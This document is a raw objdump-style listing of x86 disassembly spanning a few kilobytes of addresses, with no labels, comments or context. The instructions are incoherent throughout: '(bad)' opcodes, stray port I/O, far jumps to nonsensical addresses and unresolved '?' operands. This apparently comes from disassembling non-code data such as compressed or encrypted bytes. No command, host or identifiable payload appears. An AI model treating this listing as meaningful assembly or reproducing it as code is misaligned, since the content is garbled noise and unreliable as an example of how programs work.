  4234f0:	or     al,0x65
  4234f2:	xor    al,0xc9
  4234f4:	sbb    ch,BYTE PTR [edx-0x78bb7f65]
  4234fa:	add    BYTE PTR [ecx],al
  4234fc:	inc    esp
  4234fd:	cld    
  4234fe:	xlat   BYTE PTR ds:[ebx]
  4234ff:	test   DWORD PTR [eax],edx
  423501:	dec    ecx
  423502:	(bad)  
  423503:	mov    esp,0x7591dcdb
  423508:	push   es
  423509:	and    eax,esi
  42350b:	std    
  42350c:	(bad)  
  42350d:	fs push eax
  42350f:	xor    esp,DWORD PTR [ebx+0x58]
  423512:	fwait
  423513:	clc    
  423514:	add    eax,0xed3acd9b
  423519:	nop
  42351a:	cmp    eax,0xe0d0669d
  42351f:	lods   al,BYTE PTR ds:[esi]
  423520:	daa    
  423521:	test   BYTE PTR [ebx-0x37],ah
  423524:	mov    dl,0x72
  423526:	mov    eax,0xa9eeb226
  42352b:	mov    dl,0xdd
  42352d:	test   BYTE PTR [esi+eax*2+0x15],0x3b
  423532:	aaa    
  423533:	dec    dh
  423535:	sub    al,0xe6
  423537:	pop    esi
  423538:	cdq    
  423539:	push   es
  42353a:	imul   esi,DWORD PTR [eax],0xd260a09b
  423540:	(bad)  
  423542:	(bad)  
  423543:	jo     0x4235c0
  423545:	outs   dx,DWORD PTR ds:[esi]
  423546:	mov    ch,BYTE PTR [ebx+0x6e]
  423549:	mov    edx,0xf1ab36e6
  42354e:	sti    
  42354f:	sbb    DWORD PTR [edi+0x15],ebp
  423552:	mov    esi,0x50d8806f
  423557:	jns    0x423581
  423559:	call   0x5cf9deaa
  42355e:	or     bl,bl
  423560:	add    bh,BYTE PTR [ebp+0x4c]
  423563:	int    0xab
  423565:	scas   eax,DWORD PTR es:[edi]
  423566:	mov    ecx,eax
  423568:	adc    ebp,DWORD PTR [edi-0x4f4d2ab7]
  42356e:	inc    edi
  42356f:	dec    ebx
  423570:	lods   eax,DWORD PTR ds:[esi]
  423571:	jbe    0x4235ae
  423573:	lods   al,BYTE PTR ds:[esi]
  423574:	jle    0x423552
  423576:	scas   eax,DWORD PTR es:[edi]
  423577:	outs   dx,DWORD PTR ds:[esi]
  423578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423579:	sahf   
  42357a:	lea    edi,[ecx]
  42357c:	mov    ecx,0xc65a0015
  423581:	mov    DWORD PTR [edx-0x10],eax
  423584:	dec    ebp
  423585:	adc    DWORD PTR [edx+0x18],eax
  423588:	fdiv   QWORD PTR [ebx+0x5cff7bac]
  42358e:	and    esi,esp
  423590:	mov    eax,cs:0xff2f22a8
  423596:	mov    es,WORD PTR [ebx-0x5cf316b5]
  42359c:	add    al,0x16
  42359e:	mov    bl,0x38
  4235a0:	retw   0xe59f
  4235a4:	std    
  4235a5:	xchg   ecx,eax
  4235a6:	test   dl,bh
  4235a8:	adc    DWORD PTR ds:0xafadd6fd,ecx
  4235ae:	loope  0x423617
  4235b0:	and    al,0xed
  4235b2:	sub    BYTE PTR [ebp+0x27],bl
  4235b5:	jne    0x423570
  4235b7:	enter  0x56c9,0x98
  4235bb:	cmp    DWORD PTR [edi+0x40b74196],ebx
  4235c1:	sar    BYTE PTR [edi+0x58ed34bd],0xd3
  4235c8:	inc    ecx
  4235c9:	aaa    
  4235ca:	out    dx,al
  4235cb:	idiv   esi
  4235cd:	xchg   esi,eax
  4235ce:	jg     0x42358b
  4235d0:	inc    esi
  4235d1:	stos   DWORD PTR es:[edi],eax
  4235d2:	lods   al,BYTE PTR ds:[esi]
  4235d3:	in     al,dx
  4235d4:	xor    eax,0xb6cb697e
  4235d9:	and    al,0xc2
  4235db:	cwde   
  4235dc:	mov    ds:0x23e44857,eax
  4235e1:	jl     0x423568
  4235e3:	fnsave [esi-0x66804404]
  4235e9:	scas   eax,DWORD PTR es:[edi]
  4235ea:	push   ds
  4235eb:	mov    bh,0x12
  4235ed:	sbb    ah,0xca
  4235f0:	pop    ebx
  4235f1:	jbe    0x42365d
  4235f3:	iret   
  4235f4:	jb     0x423633
  4235f6:	mul    DWORD PTR [edx-0x13bd47a8]
  4235fc:	adc    cl,BYTE PTR [ecx-0x1dbb53e9]
  423602:	xchg   edx,eax
  423603:	mov    ebp,0x321a93d8
  423608:	mov    ch,0xd1
  42360a:	mov    ds:0x63c5f292,eax
  42360f:	(bad)  
  423610:	sbb    eax,0xcec15a00
  423615:	call   0x4af3:0x1cde10ab
  42361c:	sub    eax,0xca503b5
  423621:	fyl2x  
  423623:	dec    edx
  423624:	mov    ebp,0xa4cf5ae8
  423629:	or     al,BYTE PTR [ebp+0x2f]
  42362c:	punpckhdq mm3,QWORD PTR [edi+0x45]
  423630:	ret    0xbd09
  423633:	lods   eax,DWORD PTR ds:[esi]
  423634:	mov    BYTE PTR [eax],bl
  423636:	shl    DWORD PTR [ecx-0x37],1
  423639:	sub    eax,0x446b9148
  42363e:	adc    eax,0x471a8ef8
  423643:	and    BYTE PTR [ecx-0x4f],0x81
  423647:	jbe    0x4235ec
  423649:	mov    bl,0xa3
  42364b:	dec    ebp
  42364c:	sbb    BYTE PTR [edi-0x4017b672],dh
  423652:	sub    eax,0x9e7993e
  423657:	pop    esi
  423658:	jne    0x42368c
  42365a:	in     eax,0x43
  42365c:	push   ebx
  42365d:	cwde   
  42365e:	in     eax,0x80
  423660:	test   cl,ch
  423662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423663:	add    DWORD PTR [ecx+0x5290333e],eax
  423669:	(bad)  
  42366b:	mov    DWORD PTR [edx],eax
  42366d:	jno    0x4236ab
  42366f:	or     al,0xcd
  423671:	leave  
  423672:	enter  0x4574,0xe2
  423676:	add    al,0xa0
  423678:	popa   
  423679:	xor    eax,0x135ab9
  42367e:	push   0x833d7675
  423683:	fisttp DWORD PTR [esi]
  423685:	adc    al,0xb1
  423687:	push   cs
  423688:	popf   
  423689:	iret   
  42368a:	rol    BYTE PTR gs:[ebx+0x2891fc4d],1
  423691:	mov    al,0xdb
  423693:	lods   al,BYTE PTR ds:[esi]
  423694:	or     BYTE PTR [edi],ch
  423696:	jns    0x42363a
  423698:	ret    0xe41e
  42369b:	adc    BYTE PTR [edi+0x79],bl
  42369e:	pop    es
  42369f:	add    eax,0x668d82b
  4236a4:	cmc    
  4236a5:	push   cs
  4236a6:	cwde   
  4236a7:	test   eax,0x3e6c09af
  4236ac:	or     ah,ah
  4236ae:	arpl   WORD PTR [ecx],si
  4236b0:	push   ds
  4236b1:	xor    dl,BYTE PTR [eax]
  4236b3:	mov    DWORD PTR [ecx-0x912aed8],esp
  4236b9:	ret    0x9003
  4236bc:	daa    
  4236bd:	push   esp
  4236be:	test   al,0x48
  4236c0:	add    ebx,DWORD PTR [eax]
  4236c2:	in     al,0xe2
  4236c4:	jp     0x423693
  4236c6:	mov    bl,0xf0
  4236c8:	daa    
  4236c9:	cwde   
  4236ca:	inc    esp
  4236cb:	out    0x8e,al
  4236cd:	add    ebx,edi
  4236cf:	rcl    BYTE PTR [edi],1
  4236d1:	adc    eax,edi
  4236d3:	push   esi
  4236d4:	sbb    dl,ah
  4236d6:	cmp    eax,0x76a0805f
  4236db:	jo     0x423662
  4236dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236de:	cmp    ah,cl
  4236e0:	lds    esp,FWORD PTR ds:0x9b4490b
  4236e6:	mov    edi,0x56cc3b58
  4236eb:	adc    BYTE PTR [edi],0x56
  4236ee:	mov    ebx,0x6e902452
  4236f3:	add    BYTE PTR [edx+0x5f79f37a],0x9d
  4236fa:	(bad)  
  4236fb:	cmp    al,ah
  4236fd:	adc    al,BYTE PTR [ecx+eax*4-0xa94b9b8]
  423704:	mov    esi,0xf590d0f
  423709:	(bad)  
  42370a:	cmp    eax,0x42c5200f
  42370f:	pop    ds
  423710:	stos   BYTE PTR es:[edi],al
  423711:	repz adc BYTE PTR [eax+ebp*2],dl
  423715:	xchg   edi,eax
  423716:	(bad)  
  423717:	and    DWORD PTR [esi-0x2],eax
  42371a:	or     eax,eax
  42371c:	or     eax,0x7ed17b68
  423721:	pop    ecx
  423722:	stc    
  423723:	push   esi
  423724:	ret    0x6422
  423727:	popf   
  423728:	sbb    eax,0xdae4aed2
  42372d:	in     eax,0x14
  42372f:	imul   ebp,DWORD PTR [ebp-0x70],0xdf783d1e
  423736:	add    ecx,edi
  423738:	ret    
  423739:	dec    ecx
  42373a:	in     al,0x26
  42373c:	mov    dl,0x64
  42373e:	das    
  42373f:	aas    
  423740:	jle    0x42379b
  423742:	in     eax,dx
  423743:	enter  0x3499,0x1b
  423747:	(bad)  
  423748:	repnz pushf 
  42374a:	and    DWORD PTR [ebx],edx
  42374c:	shl    DWORD PTR cs:0x1733e0d4,0xb5
  423754:	adc    ah,BYTE PTR [eax+0x5a]
  423757:	repz cld 
  423759:	mov    ?,ebx
  42375b:	push   ss
  42375c:	or     BYTE PTR [ebx+0xe],bl
  42375f:	(bad)  
  423760:	out    dx,eax
  423761:	sbb    dl,dh
  423763:	mov    eax,0xbf9215ed
  423768:	mov    dh,0x31
  42376a:	sbb    al,0x13
  42376c:	sub    cl,BYTE PTR [ebx+0x5ed78706]
  423772:	or     BYTE PTR [ecx-0x43598c3e],dl
  423778:	or     al,0x9c
  42377a:	(bad)  
  42377b:	xlat   BYTE PTR ds:[ebx]
  42377c:	dec    edx
  42377d:	cmp    BYTE PTR [esi-0x6eaeefe7],ah
  423783:	sbb    DWORD PTR [ebp+0x50fc945e],ebp
  423789:	fcmovbe st,st(5)
  42378b:	out    dx,al
  42378c:	pop    ds
  42378d:	dec    ebx
  42378e:	mov    BYTE PTR [eax+0xa9d7b78],dl
  423794:	xor    BYTE PTR ds:0x7c72db59,ah
  42379a:	retf   
  42379b:	jno    0x42378b
  42379d:	jae    0x4237c1
  42379f:	inc    ebp
  4237a0:	add    dh,BYTE PTR [esi]
  4237a2:	into   
  4237a3:	xchg   edx,eax
  4237a4:	jmp    0xe41:0xe58972af
  4237ab:	jb     0x4237a2
  4237ad:	jns    0x42373c
  4237af:	sbb    al,BYTE PTR [eax-0x2a]
  4237b2:	les    ebx,FWORD PTR [edi+eax*8-0x7384f5d3]
  4237b9:	sbb    bl,BYTE PTR [ebx-0x6e2f2de]
  4237bf:	repnz ss pop es
  4237c2:	adc    ch,dh
  4237c4:	outs   dx,BYTE PTR ds:[esi]
  4237c5:	xchg   ebx,eax
  4237c6:	es mov ?,ebx
  4237c9:	sbb    eax,0x54d57d45
  4237ce:	push   edi
  4237cf:	push   ebp
  4237d0:	popf   
  4237d1:	adc    eax,0xa237bc29
  4237d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237d7:	fistp  WORD PTR [edx+edi*1]
  4237da:	jno    0x423779
  4237dc:	jmp    0xe8fbf0c9
  4237e1:	and    eax,0x522a2a13
  4237e6:	xor    al,BYTE PTR ds:0x13206042
  4237ec:	and    eax,DWORD PTR fs:[esi]
  4237ef:	ss mov edx,es
  4237f2:	test   DWORD PTR [esi-0x3f645ab2],esp
  4237f8:	mov    eax,ds:0x7ec46fa5
  4237fd:	push   ebp
  4237fe:	xor    al,0x93
  423800:	mov    ebx,0xd8d5a7a3
  423805:	pop    ds
  423806:	loope  0x4237be
  423808:	in     eax,0xa6
  42380a:	and    ecx,ecx
  42380c:	pop    edx
  42380d:	mov    ch,0x64
  42380f:	ds jge 0x423818
  423812:	sub    DWORD PTR ds:0xddacd217,edi
  423818:	repz or BYTE PTR [edi],cl
  42381b:	xor    esp,0x59
  42381e:	xchg   DWORD PTR [eax-0x2141d07d],ebp
  423824:	ret    0x84b3
  423827:	jg     0x42381c
  423829:	mov    dl,0x10
  42382b:	jbe    0x4237fe
  42382d:	inc    ebx
  42382e:	push   eax
  42382f:	adc    BYTE PTR [eax],dh
  423831:	es cdq 
  423833:	pop    es
  423834:	lea    esi,[edx+0x41f81e8a]
  42383a:	mov    ds:0xd25ebe94,al
  42383f:	cwde   
  423840:	test   al,0x80
  423842:	lods   al,BYTE PTR ds:[esi]
  423843:	ret    
  423844:	or     dh,bl
  423846:	iret   
  423847:	sub    al,0xa6
  423849:	les    esp,FWORD PTR [ebx]
  42384b:	mov    al,0xca
  42384d:	sub    al,BYTE PTR [ecx+0x6a]
  423850:	inc    edx
  423851:	xor    ecx,0x5e
  423854:	iret   
  423855:	js     0x423803
  423857:	inc    ebx
  423858:	mov    ch,0x58
  42385a:	icebp  
  42385b:	mov    ds:0xa3ccc3db,al
  423860:	push   esp
  423861:	in     eax,0xbb
  423863:	in     al,0x5e
  423865:	xchg   esi,eax
  423866:	or     al,0xbc
  423869:	cld    
  42386a:	fwait
  42386b:	cmp    DWORD PTR [ecx+0x23443ece],edi
  423871:	inc    ebx
  423872:	imul   eax,DWORD PTR ds:0x193b72dc,0x58
  423879:	aas    
  42387a:	adc    esi,DWORD PTR gs:[ecx+0x2b]
  42387e:	lods   eax,DWORD PTR ds:[esi]
  42387f:	in     eax,dx
  423880:	pop    ds
  423881:	sub    BYTE PTR [ebp-0x1b29f9a6],dh
  423887:	cdq    
  423888:	and    ebx,esi
  42388a:	frstor [ebp+0x25f1851a]
  423890:	jae    0x42388c
  423892:	in     al,0x42
  423894:	pop    esi
  423895:	sub    eax,0xaaee66e2
  42389a:	jle    0x4238d0
  42389c:	cmp    esp,DWORD PTR [ebp-0x60]
  42389f:	adc    eax,0xd5a27068
  4238a4:	push   esp
  4238a5:	add    eax,0xb9cee397
  4238aa:	aas    
  4238ab:	dec    eax
  4238ac:	pop    ebx
  4238ad:	imul   edx,DWORD PTR [edi+eiz*4-0x7f],0x67
  4238b2:	std    
  4238b3:	aas    
  4238b4:	leave  
  4238b5:	test   eax,0xdcaa7926
  4238ba:	ror    BYTE PTR [ecx+0x54b23376],cl
  4238c0:	jno    0x4238b1
  4238c2:	mov    eax,DWORD PTR [esi]
  4238c4:	add    edi,DWORD PTR [edx+0x34693a6]
  4238ca:	sub    dh,al
  4238cc:	push   DWORD PTR [edx]
  4238ce:	xchg   esi,eax
  4238cf:	xchg   ecx,eax
  4238d0:	inc    eax
  4238d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238d2:	or     DWORD PTR [edi-0x571045aa],esi
  4238d8:	jecxz  0x423952
  4238da:	mov    gs,WORD PTR [eax-0x3f]
  4238dd:	xchg   BYTE PTR [edx-0x133af72],bl
  4238e3:	in     al,0xf9
  4238e5:	(bad)  
  4238e7:	adc    DWORD PTR [edi],esi
  4238e9:	outs   dx,BYTE PTR ds:[esi]
  4238ea:	cmc    
  4238eb:	mov    cl,0x1f
  4238ed:	je     0x423898
  4238ef:	js     0x423884
  4238f1:	loope  0x423946
  4238f3:	xor    eax,DWORD PTR [edi]
  4238f5:	hlt    
  4238f6:	adc    eax,0xbf44b503
  4238fb:	add    BYTE PTR es:[bp+si-0x3],cl
  423900:	bound  esp,QWORD PTR [esi]
  423902:	jmp    0x897d75a8
  423907:	cmc    
  423908:	adc    DWORD PTR [ebp-0x6bea5f89],0x454944a5
  423912:	repnz xor ecx,ebp
  423915:	or     ebx,ebx
  423917:	sbb    al,0x9
  423919:	scas   eax,DWORD PTR es:[edi]
  42391a:	mov    cl,0xe1
  42391c:	sar    BYTE PTR [ecx],1
  42391e:	pop    es
  42391f:	mov    dh,0x84
  423921:	stc    
  423922:	mov    al,ds:0x1437c0b7
  423927:	fcmovbe st,st(2)
  423929:	adc    dh,BYTE PTR [edx+0x4b]
  42392c:	xor    BYTE PTR [ebp+0x20],dh
  42392f:	(bad)  
  423931:	mov    esi,0x9317c278
  423936:	shl    BYTE PTR [edi-0x4f9fd384],1
  42393c:	pop    eax
  42393d:	sub    al,0x4a
  42393f:	pop    edi
  423940:	rcr    di,cl
  423943:	pop    ebx
  423944:	arpl   WORD PTR [esi+0x563ad6e9],di
  42394a:	(bad)  
  42394b:	stc    
  42394c:	out    0xbc,eax
  42394e:	imul   ebx,esi,0x3d4b2a1a
  423954:	aaa    
  423955:	mov    edx,0x674880ad
  42395a:	inc    eax
  42395b:	inc    edi
  42395c:	rcl    BYTE PTR [edi-0x66],cl
  42395f:	sub    esp,edi
  423961:	leave  
  423962:	(bad)  
  423963:	stos   DWORD PTR es:[edi],eax
  423964:	std    
  423965:	push   edi
  423966:	fdivr  QWORD PTR [esi+0x52]
  423969:	sub    DWORD PTR [edi],ecx
  42396b:	fcomi  st,st(3)
  42396d:	cmp    al,0x38
  42396f:	mov    ebx,0xd1abb23f
  423974:	icebp  
  423975:	push   edi
  423976:	push   cs
  423977:	sti    
  423978:	and    bh,BYTE PTR [ebx+0x1a]
  42397b:	inc    ebx
  42397c:	cdq    
  42397d:	stos   DWORD PTR es:[edi],eax
  42397e:	sti    
  42397f:	pop    ebp
  423980:	fwait
  423981:	daa    
  423982:	dec    esp
  423983:	or     ebx,0x919c37b4
  423989:	(bad)  
  42398a:	aas    
  42398b:	push   ecx
  42398c:	adc    BYTE PTR [ecx+eiz*2],ch
  42398f:	mov    ds:0x88fb84aa,al
  423994:	pop    esp
  423995:	and    eax,0xccc069c
  42399a:	xchg   esp,eax
  42399b:	icebp  
  42399c:	push   cs
  42399d:	inc    esi
  42399e:	int    0xa1
  4239a0:	push   ecx
  4239a1:	and    eax,0x379e9892
  4239a6:	icebp  
  4239a7:	jne    0x4239c8
  4239a9:	pop    edi
  4239aa:	in     eax,0x55
  4239ac:	pop    ecx
  4239ad:	iret   
  4239ae:	add    BYTE PTR [esp+ebx*2],ah
  4239b1:	and    eax,0x85d4f0b1
  4239b6:	lea    esp,[ecx]
  4239b8:	jmp    0x8da6c028
  4239bd:	cwde   
  4239be:	enter  0xacb6,0x9c
  4239c2:	les    esp,FWORD PTR [ebp+0x3cd43372]
  4239c8:	div    BYTE PTR [eax-0x2c588b4b]
  4239ce:	fistp  DWORD PTR [ebx-0x7a]
  4239d1:	push   0x13
  4239d3:	sbb    ebp,DWORD PTR [ebx-0xb797ead]
  4239d9:	sub    edx,DWORD PTR [edx]
  4239db:	mov    ch,0x95
  4239dd:	push   cs
  4239de:	sub    bh,BYTE PTR [edx-0x65]
  4239e1:	shl    DWORD PTR [esi+edi*1+0x5c4fb055],0xb1
  4239e9:	xlat   BYTE PTR ds:[ebx]
  4239ea:	mov    edx,0xae471b7a
  4239ef:	in     eax,0x62
  4239f1:	dec    ebp
  4239f2:	or     eax,0x2418985b
  4239f7:	test   al,0xab
  4239f9:	retf   
  4239fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239fb:	ds imul ebx,eax,0x45
  4239ff:	inc    esi
  423a00:	(bad)  
  423a01:	gs mov eax,?
  423a04:	or     al,0xd4
  423a06:	cld    
  423a07:	jle    0x423992
  423a09:	mov    WORD PTR [edi+edi*4],?
  423a0c:	bound  edx,QWORD PTR [edi*4+0x26385afb]
  423a13:	test   eax,0xe8ca7749
  423a18:	dec    esp
  423a19:	xor    eax,0x8a770cc1
  423a1e:	cmp    eax,DWORD PTR [eax+0x6b]
  423a21:	or     BYTE PTR [esp+eax*2-0x4dd0cb73],ch
  423a28:	pop    DWORD PTR ds:0x6ebcbfb
  423a2e:	pop    esi
  423a2f:	xor    BYTE PTR [ebx-0x79],dl
  423a32:	jmp    0x4239fd
  423a34:	push   ds
  423a35:	push   0x938835a9
  423a3a:	and    BYTE PTR [ebx-0x43be9873],cl
  423a40:	push   0x83f3cdbf
  423a45:	jne    0x4239f7
  423a47:	jbe    0x423ac0
  423a49:	gs or  eax,0xf938a1a0
  423a4f:	or     al,0x8d
  423a51:	in     eax,0xdd
  423a53:	add    DWORD PTR [ebx+ebp*2+0xe],ebx
  423a57:	pop    eax
  423a58:	ins    BYTE PTR es:[edi],dx
  423a59:	into   
  423a5a:	fwait
  423a5b:	daa    
  423a5c:	outs   dx,BYTE PTR ds:[esi]
  423a5d:	icebp  
  423a5e:	xor    ecx,DWORD PTR [ecx]
  423a60:	mov    edi,0x1d00c1e5
  423a65:	fisub  DWORD PTR [eax-0x5f]
  423a68:	or     BYTE PTR [esi-0xb],cl
  423a6b:	js     0x423a1d
  423a6d:	lods   eax,DWORD PTR ds:[esi]
  423a6e:	je     0x423a2b
  423a70:	or     al,0xde
  423a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a73:	shr    BYTE PTR [ecx-0x5ee6b824],0xe7
  423a7a:	out    dx,eax
  423a7b:	cmp    al,BYTE PTR [esp+ebp*1]
  423a7e:	dec    ecx
  423a7f:	sar    DWORD PTR [ebp+0x36b9554d],cl
  423a85:	leave  
  423a86:	cmp    ebx,DWORD PTR ds:0x149d0dd4
  423a8c:	shr    BYTE PTR [ebx+0x44],0xb
  423a90:	xor    ecx,DWORD PTR [esi]
  423a92:	mov    bl,BYTE PTR [esi-0x4d6ba241]
  423a98:	mov    edx,ds
  423a9a:	mov    cl,0xaa
  423a9c:	cmp    cl,BYTE PTR [esp+esi*1]
  423a9f:	ficomp WORD PTR [esi]
  423aa1:	pop    edx
  423aa2:	pusha  
  423aa3:	popf   
  423aa4:	mov    edi,0x3f9442e1
  423aa9:	pop    esi
  423aaa:	loopne 0x423ad4
  423aac:	mov    dh,0x8d
  423aae:	xchg   ebp,eax
  423aaf:	or     eax,0x8f1a707f
  423ab4:	jne    0x423af3
  423ab6:	icebp  
  423ab7:	cmp    bl,BYTE PTR [edi+0x5aeade78]
  423abd:	out    0x89,al
  423abf:	in     al,dx
  423ac0:	daa    
  423ac1:	push   ss
  423ac2:	nop
  423ac3:	test   al,0x84
  423ac5:	mov    ?,edi
  423ac7:	scas   al,BYTE PTR es:[edi]
  423ac8:	xchg   al,dl
  423aca:	in     al,0x5a
  423acc:	or     al,BYTE PTR [edx]
  423ace:	dec    ecx
  423acf:	mov    cl,0x46
  423ad1:	sub    al,0x8d
  423ad3:	and    al,0xb2
  423ad5:	pop    ss
  423ad6:	int    0x87
  423ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad9:	jns    0x423ab3
  423adb:	int3   
  423adc:	mov    eax,0xcc018554
  423ae1:	cmp    eax,0x61b41f98
  423ae6:	not    ebx
  423ae8:	cmp    dh,BYTE PTR [edi]
  423aea:	mov    BYTE PTR [ebx-0xd032e84],dh
  423af0:	mov    bh,0x4c
  423af2:	pop    esi
  423af3:	ds ins DWORD PTR es:[edi],dx
  423af5:	push   ds
  423af6:	enter  0x8bf9,0x93
  423afa:	fist   WORD PTR [esp+eiz*4-0x9]
  423afe:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b00:	xchg   ebp,eax
  423b01:	out    0xb5,eax
  423b03:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  423b05:	sar    BYTE PTR [eax-0x653cdacb],1
  423b0b:	aas    
  423b0c:	dec    esp
  423b0d:	imul   edi,DWORD PTR [eax+esi*2+0xea4874a],0xffffffce
  423b15:	push   ebp
  423b16:	cmp    al,0x6
  423b18:	push   esp
  423b19:	scas   al,BYTE PTR es:[edi]
  423b1a:	lahf   
  423b1b:	int    0xa9
  423b1d:	sub    ah,BYTE PTR [eax-0x6b]
  423b20:	arpl   WORD PTR [edx-0x6],bx
  423b23:	pop    eax
  423b24:	popf   
  423b25:	mov    cs,WORD PTR [ebp+0x5a4be190]
  423b2b:	pop    ds
  423b2c:	and    eax,0xb9482190
  423b31:	mov    edx,0x10a973e5
  423b36:	arpl   ax,bp
  423b38:	sub    eax,0x901ee732
  423b3d:	test   BYTE PTR [esi],bl
  423b3f:	mov    esi,0x8226daa4
  423b44:	fdivr  DWORD PTR [ebx]
  423b46:	arpl   WORD PTR [edi],bx
  423b48:	cwde   
  423b49:	mov    al,0xc3
  423b4b:	popa   
  423b4c:	sbb    BYTE PTR [edi],dh
  423b4e:	pusha  
  423b4f:	loopne 0x423b51
  423b51:	shl    DWORD PTR [edi],cl
  423b53:	push   cs
  423b54:	sub    cl,BYTE PTR [ebx]
  423b56:	mov    eax,0x24ea5be7
  423b5b:	mov    bl,0x63
  423b5d:	and    bp,WORD PTR [ecx-0x4533136a]
  423b64:	pop    ebx
  423b65:	sub    eax,0xfb634ddd
  423b6a:	ins    DWORD PTR es:[edi],dx
  423b6b:	mov    eax,0x953ebca7
  423b70:	lahf   
  423b71:	jbe    0x423ba4
  423b73:	fcom   QWORD PTR [ebx+0x1b047d03]
  423b79:	loope  0x423bbd
  423b7b:	push   ds
  423b7c:	das    
  423b7d:	mov    ch,0x20
  423b7f:	arpl   WORD PTR [edi+0x566ecdeb],ax
  423b85:	dec    edx
  423b86:	mov    DWORD PTR [eax-0x25d0af03],edi
  423b8c:	mov    al,ds:0xb90ba9e6
  423b91:	mov    ecx,0x982b87b9
  423b96:	xchg   esi,eax
  423b97:	pop    ds
  423b98:	jmp    0xf10b:0x64ead04d
  423b9f:	ret    0xe945
  423ba2:	or     ah,BYTE PTR [esi+0xd823a3c]
  423ba8:	shrd   DWORD PTR [ebp-0x197f6e7c],edi,cl
  423baf:	in     eax,dx
  423bb0:	fwait
  423bb1:	dec    ebp
  423bb2:	mov    ebp,0x9f131bc9
  423bb7:	popa   
  423bb8:	daa    
  423bb9:	and    BYTE PTR [ebp-0x21],bl
  423bbc:	or     BYTE PTR [ebp+0x39c9606a],cl
  423bc2:	cs and al,0xc8
  423bc5:	dec    ebx
  423bc6:	je     0x423c43
  423bc8:	xor    BYTE PTR [ebx+0x14f92824],bl
  423bce:	add    BYTE PTR [ebp-0x28],ch
  423bd1:	add    eax,0x6dd3a9da
  423bd6:	adc    ebp,DWORD PTR [ebp+0x7d]
  423bd9:	cld    
  423bda:	stos   DWORD PTR es:[edi],eax
  423bdb:	mov    ch,0xa6
  423bdd:	push   es
  423bde:	push   0xffffffba
  423be0:	out    dx,al
  423be1:	jge    0x423b74
  423be3:	adc    DWORD PTR [esi-0x163707a],eax
  423be9:	mov    dh,0xed
  423beb:	lds    edx,FWORD PTR [ebx-0x17c94b15]
  423bf1:	into   
  423bf2:	pushf  
  423bf3:	mov    ds:0x98eeacd3,eax
  423bf8:	push   0xe77f7ef8
  423bfd:	sti    
  423bfe:	cmp    al,0xfa
  423c00:	or     DWORD PTR [ecx-0x1d95ee36],ecx
  423c06:	loopne 0x423bf5
  423c08:	retf   
  423c09:	inc    edi
  423c0a:	loope  0x423c3a
  423c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c0f:	(bad)  
  423c10:	mov    ebp,0x6cae5b36
  423c15:	das    
  423c16:	dec    edx
  423c17:	lock inc edx
  423c19:	cmp    al,0xdb
  423c1b:	push   esp
  423c1c:	jmp    0xb6a1:0xf983a18e
  423c23:	in     eax,0x83
  423c25:	push   edi
  423c26:	jb     0x423c33
  423c28:	mov    BYTE PTR [edx+0x4ef8d04e],al
  423c2e:	jnp    0x423c25
  423c30:	mov    ah,0x93
  423c32:	inc    eax
  423c33:	das    
  423c34:	les    ebx,FWORD PTR [ecx+0x1e5f3f19]
  423c3a:	and    al,0x86
  423c3c:	mov    cl,BYTE PTR [ebx+0x74]
  423c3f:	js     0x423c94
  423c41:	jmp    0x53320a68
  423c46:	popf   
  423c47:	dec    esp
  423c48:	sub    bh,bl
  423c4a:	mov    ds,WORD PTR [eax]
  423c4c:	push   esp
  423c4d:	frstor [esi]
  423c4f:	lahf   
  423c50:	adc    BYTE PTR [ebp+0x2f8acac2],ch
  423c56:	daa    
  423c57:	add    eax,0x87e08429
  423c5c:	mov    ebp,0x3be0f28f
  423c61:	je     0x423ca8
  423c63:	jae    0x423c7b
  423c65:	out    dx,al
  423c66:	fcomip st,st(4)
  423c68:	retf   0xd7eb
  423c6b:	je     0x423bfd
  423c6d:	sub    DWORD PTR [edx],esi
  423c6f:	or     al,BYTE PTR [edi+0xe]
  423c72:	(bad)  
  423c74:	dec    esi
  423c75:	sub    DWORD PTR [eax+0xfa1eb6e],ebp
  423c7b:	inc    edx
  423c7c:	cdq    
  423c7d:	mov    ah,0x2b
  423c7f:	jge    0x423c38
  423c81:	neg    DWORD PTR [edi-0xa419b2]
  423c87:	pop    es
  423c88:	mov    dl,0xd5
  423c8a:	fnstenv [eax-0x55]
  423c8d:	inc    esi
  423c8e:	sbb    ch,0x61
  423c91:	add    BYTE PTR [ebx+0x43cab8da],ah
  423c97:	pop    ecx
  423c98:	punpckhwd mm4,QWORD PTR [esi+0x21eb6f51]
  423c9f:	inc    edx
  423ca0:	xor    al,0x9f
  423ca2:	or     cl,BYTE PTR [ebp-0x2c]
  423ca5:	xchg   edx,eax
  423ca6:	rcr    DWORD PTR [eax+0x47c55fa4],1
  423cac:	das    
  423cad:	sbb    eax,0xc1a587d0
  423cb2:	shr    DWORD PTR [esi+0x5b],cl
  423cb5:	cmc    
  423cb6:	xor    eax,0x88eba297
  423cbb:	lea    ebp,[edi-0x1c]
  423cbe:	pop    eax
  423cbf:	push   ebp
  423cc0:	out    dx,al
  423cc1:	add    eax,0xd032168d
  423cc6:	push   ecx
  423cc7:	gs imul edx,edx,0x3f
  423ccb:	pop    ebp
  423ccc:	into   
  423ccd:	inc    edx
  423cce:	into   
  423ccf:	repz mov ds:0x19167071,eax
  423cd5:	adc    ah,dl
  423cd7:	jbe    0x423c8c
  423cd9:	lods   al,BYTE PTR ds:[esi]
  423cda:	push   es
  423cdb:	aas    
  423cdc:	inc    esp
  423cdd:	mov    bl,0xdc
  423cdf:	and    edi,esp
  423ce1:	(bad)  
  423ce2:	dec    ebx
  423ce3:	imul   edx,DWORD PTR [ecx+0x3737d50d],0xd370a0a0
  423ced:	adc    al,0xd2
  423cef:	(bad)  
  423cf0:	das    
  423cf1:	mov    esp,0x18ce1f9a
  423cf6:	jecxz  0x423c91
